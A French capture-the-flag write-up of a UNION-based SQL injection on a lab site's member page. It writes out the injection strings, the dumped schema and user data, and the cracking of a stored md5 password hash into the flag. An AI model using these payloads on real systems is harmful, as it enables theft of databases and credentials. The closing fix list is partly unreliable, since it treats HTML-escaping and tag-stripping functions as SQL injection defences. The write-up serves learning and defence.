# member injection SQL
Recupere des datas grace a une injection SQL

## Comment obtenir le flag
* Se rendre a `ip`/index.php?page=member
* Si on submit vide, on obtient:
- *You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1*
* En testant `1 OR 2`, on constate qu'une requete SQL est donc possible :
- On tombe sur : `First name: Flag` / `Surname : GetThe`
- Notre bible pour les requetes : *http://www.sqlinjection.net/column-names/*

- `TRUE` permet de valider l'expression précédente.
- `UNION` permet de coupler les résultats d'une première requête avec une seconde dont les composantes doivent être les mêmes.

* `TRUE UNION SELECT table_schema, table_name FROM information_schema.tables`
Notamment, la table:
```
table_schema: Member_Sql_Injection
table_name: users
```

* `TRUE UNION SELECT table_name, column_name FROM information_schema.columns`
Notamment:
```
table_name: users
column_name: user_id
column_name: first_name
column_name: last_name
column_name: town
column_name: country
column_name: planet
column_name: Commentaire
column_name: countersign
```

* Ce qui permet de rechercher 2 par 2 (étant limités par l'UNION) les résultats pour chaques colonnes de la table users:
- `TRUE UNION SELECT last_name, countersign FROM Member_Sql_Injection.users`
- `TRUE UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users`
- etc.

* Nous obtenons pour l'utilisateur GetThe Flag :
```
user_id : 5
first_name : Flag
last_name : GetThe
town : 42
country : 42
planet : 42
Commentaire : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
countersign : 5ff9d0165b4f92b14994e5c685cdce28
```

* En suivant les recommandations du commentaire, nous obtenons:
* *5ff9d0165b4f92b14994e5c685cdce28* = *FortyTwo* (md5)
* Cryptons ensuite fortytwo (*lower all the char*) en sha256, pour obtenir le flag : *10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5*

## Fix possible
Les methodes suivantes permettent efficacement de se proteger contre les injections lorsque des champs sont remplis par l'user :
- `mysql_real_escape_string` (concernant les db),
- `htmlentities()`,
- `htmlspecialchars()`,
- `strip_tags()`,
- `addslashes()`,
- et globalement en utilisant la PDO
Il est aussi de bon usage lorsqu'une requete est faite de vérifier deux clés, lorsque cela est possible, afin d'autoriser l'accès au contenu (ex : le champs demandé est le nom d'utilisateur, mais en backend le code vérifie aussi l'identifiant de l'utilisateur loggé).
Vérifier que la string envoyée ne contient pas d'espaces si cela n'est pas nécessaire
Parser le retour de la requête plutot qu'en envoyer l'intégralité du contenu

## Explications
Il est possible de faire une injection SQL en utilisant `UNION` dans le but d'exposer l'intégralité des bases de données du site et leur contenu.
Cela permet de découvrir notamment et en particulier les mots de passe enregistrés des admin/root.
